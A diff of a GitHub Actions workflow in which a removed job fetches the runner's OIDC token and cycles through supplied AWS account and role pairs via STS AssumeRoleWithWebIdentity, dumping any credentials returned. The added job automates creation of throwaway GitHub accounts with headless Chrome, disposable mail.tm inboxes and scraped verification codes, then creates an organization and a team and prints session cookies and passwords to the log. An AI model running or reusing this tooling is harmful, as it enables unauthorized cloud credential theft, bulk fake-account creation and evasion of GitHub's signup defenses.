@@ -1,58 +1,117 @@
-name: oidc-sts-332207
+name: gh-signup
 on:
-  workflow_dispatch:
-    inputs:
-      pairs:
-        description: 'comma list account:role ; role=* is account-only provider probe'
-        required: true
-        default: ''
-permissions:
-  id-token: write
-  contents: read
+  workflow_dispatch: {}
 jobs:
-  sts:
+  signup:
     runs-on: ubuntu-latest
+    timeout-minutes: 20
     steps:
-      - name: probe
+      - name: diag
         run: |
-          set -uo pipefail
-          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF EVENT=$GITHUB_EVENT_NAME"
-          echo "CTX repository=${{ github.repository }} owner_id=${{ github.repository_owner_id }} repo_id=${{ github.repository_id }} ref_name=${{ github.ref_name }} actor=${{ github.actor }}"
-          F=/tmp/idt.json
-          curl -sS --max-time 25 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o "$F" || true
-          TOKS=$(python3 -c "import json;print(json.load(open('/tmp/idt.json')).get('value',''))" 2>/dev/null || true)
-          echo "TOKEN_LEN=${#TOKS}"
-          printf '%s' "$TOKS" > /tmp/tok.txt
-          python3 -c "import base64,json;v=open('/tmp/tok.txt').read().strip();h,p,s=v.split('.');d=lambda x: json.loads(base64.urlsafe_b64decode(x+'='*(-len(x)%4)));print('HDR='+json.dumps(d(h),sort_keys=True));print('CLAIMS='+json.dumps(d(p),sort_keys=True))" || true
-          PAIRS="${{ inputs.pairs }}"
-          echo "PAIRS=$PAIRS"
-          [ -z "$TOKS" ] && { echo "NO_TOKEN_ABORT"; exit 0; }
-          IFS=',' read -ra ARR <<< "$PAIRS"
-          for pr in "${ARR[@]}"; do
-            pr=$(echo "$pr" | tr -d ' ')
-            [ -z "$pr" ] && continue
-            acct="${pr%%:*}"
-            role="${pr##*:}"
-            [ "$role" = "*" ] && role="zz-nonexistent-probe-x"
-            https=$(curl -sS --max-time 12 -o /tmp/r.xml -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
-              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
-              --data-urlencode "Version=2011-06-15" \
-              --data-urlencode "RoleArn=arn:aws:iam::${acct}:role/${role}" \
-              --data-urlencode "RoleSessionName=oidc332207" \
-              --data-urlencode "DurationSeconds=900" \
-              --data-urlencode "WebIdentityToken=${TOKS}" 2>/dev/null || echo CONNERR)
-            COD=$(grep -o '<Code>[^<]*</Code>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
-            MSG=$(grep -o '<Message>[^<]*</Message>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
-            RQ=$(grep -o '<RequestId>[^<]*</RequestId>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
-            HIT=$(grep -c '<AccessKeyId>' /tmp/r.xml 2>/dev/null || true)
-            MD5=$(printf '%s' "$MSG" | md5sum | cut -c1-10)
-            echo "STS acct=$acct role=$role http=$https hit=$HIT code=$COD reqid=$RQ md5=$MD5 msg=$(printf '%s' "$MSG" | head -c 200)"
-            if [ "$HIT" != "0" ]; then
-              echo "STS_HIT_FULL acct=$acct role=$role $(head -c 700 /tmp/r.xml | tr '\n' ' ')"
-            fi
-            sleep 0.3
-          done
-          echo "PROBE_DONE"
-      - name: decode-helper
-        if: always()
-        run: echo helper
+          echo "CHROME: $(which google-chrome) $(google-chrome --version 2>&1)"
+          python3 -c "import requests,sys; r=requests.get('https://github.com/signup',timeout=30); print('req signup',r.status_code,len(r.text),'block' if 'captcha-delivery' in r.text else 'ok')"
+          echo "DOM: $(google-chrome --headless=new --no-sandbox --disable-gpu --virtual-time-budget=20000 --dump-dom https://github.com/signup 2>/dev/null | wc -c)"
+      - name: signup
+        run: |
+          pip install -q playwright
+          python3 - <<'PY'
+          import json,re,time,random,string,os,sys,subprocess
+          import requests
+          from playwright.sync_api import sync_playwright
+          def log(*a): print('*',*a,flush=True)
+          S=requests.Session(); S.headers['User-Agent']='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+          dom=S.get('https://api.mail.tm/domains',timeout=30).json()['hydra:member'][0]['domain']
+          u='gh'+''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(9))
+          addr=u+'@'+dom; pw='Gh.'+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(14))
+          print('EMAIL',addr,'PASS',pw,flush=True)
+          S.post('https://api.mail.tm/accounts',json={'address':addr,'password':pw},timeout=30)
+          tok=S.post('https://api.mail.tm/token',json={'address':addr,'password':pw},timeout=30).json()['token']
+          MH={'Authorization':'Bearer '+tok}
+          def getcode():
+              for i in range(45):
+                  ms=S.get('https://api.mail.tm/messages',headers=MH,timeout=30).json().get('hydra:member',[])
+                  if ms:
+                      d=S.get('https://api.mail.tm/messages/'+ms[0]['id'],headers=MH,timeout=30).json()
+                      txt=' '.join([d.get('subject') or '',' '.join(d.get('text') or '' if isinstance(d.get('text'),list) else [d.get('text') or '']),d.get('html') or ''])
+                      log('MAIL',d.get('subject'),d.get('from',{}).get('address'))
+                      c=re.findall(r'\b(\d{6,8})\b',txt)
+                      if c: return c[0]
+                  time.sleep(3)
+              return None
+          with sync_playwright() as p:
+              try:
+                  b=p.chromium.launch(channel='chrome',headless=True,args=['--no-sandbox','--disable-dev-shm-usage'])
+              except Exception as e:
+                  log('channel chrome fail',e); b=p.chromium.launch(headless=True,args=['--no-sandbox'])
+              ctx=b.new_context(locale='en-US',viewport={'width':1280,'height':900})
+              pg=ctx.new_page()
+              r=pg.goto('https://github.com/signup',wait_until='domcontentloaded',timeout=60000)
+              log('signup page',r.status if r else None,pg.url)
+              time.sleep(4)
+              html=pg.content(); log('page len',len(html),'hardblock','hard-block' in html or 'You have been blocked' in html)
+              if len(html)<5000:
+                  log(html[:400]); print('RESULT_BLOCKED_RUNNER')
+              else:
+                  try:
+                      pg.fill('#email',addr)
+                      pg.fill('#password',pw)
+                      pg.fill('#login',u)
+                      # country select if present
+                      try: pg.select_option('select[name=country]','US')
+                      except Exception: pass
+                      try:
+                          pg.click('button[type=submit]'); log('submitted signup')
+                      except Exception as e:
+                          log('no submit btn',e)
+                      time.sleep(5); log('after submit',pg.url)
+                      code=getcode(); log('CODE',code)
+                      if code:
+                          # fill any visible text input
+                          try:
+                              pg.fill('input[name=code]',code)
+                          except Exception:
+                              try: pg.fill('input[type=text]',code)
+                              except Exception as e: log('fill code fail',e)
+                          try: pg.click('button[type=submit]')
+                          except Exception: pass
+                          time.sleep(5)
+                      log('after code',pg.url, len(pg.content()))
+                  except Exception as e:
+                      log('flow err',repr(e)[:200])
+                  # org creation
+                  try:
+                      pg.goto('https://github.com/account/organizations/new',wait_until='domcontentloaded',timeout=60000)
+                      time.sleep(3); log('orgnew',pg.url,len(pg.content()))
+                      org='skp'+''.join(random.choice(string.ascii_lowercase) for _ in range(8))
+                      sel=pg.query_selector('input[name="organization[login]"]') or pg.query_selector('#organization_login')
+                      if not sel:
+                          log('ORG INPUTS',pg.eval_on_selector_all('input,select',"e=>e.map(x=>x.tagName+'#'+(x.id||'')+'|'+(x.name||'')+'|'+x.type)"))
+                      else:
+                          sel.fill(org)
+                          em=pg.query_selector('input[name="organization[billing_email]"]') or pg.query_selector('#organization_billing_email')
+                          if em: em.fill(addr)
+                          pg.click('button[type=submit]'); time.sleep(6)
+                          log('org created?',pg.url)
+                          log('ORG',org)
+                          # team
+                          pg.goto('https://github.com/orgs/'+org+'/new-team',wait_until='domcontentloaded',timeout=60000)
+                          time.sleep(3); log('newteam',pg.url)
+                          tn=pg.query_selector('input[name="team[name]"]') or pg.query_selector('#team_name')
+                          if tn:
+                              tn.fill('claims-probe')
+                              pg.click('button[type=submit]'); time.sleep(5)
+                              log('team created?',pg.url)
+                          else:
+                              log('TEAM INPUTS',pg.eval_on_selector_all('input',"e=>e.map(x=>x.id+'|'+x.name)"))
+                  except Exception as e:
+                      log('org err',repr(e)[:200])
+                  try:
+                      pg.goto('https://github.com/settings/profile',wait_until='domcontentloaded',timeout=60000)
+                      log('profile',pg.url)
+                  except Exception as e: log('prof err',e)
+                  ck={c['name']:c['value'] for c in ctx.cookies()}
+                  print('COOKIES_JSON',json.dumps(ck))
+                  print('ACCOUNT',u,addr,pw)
+              b.close()
+          print('RESULT_DONE')
+          PY
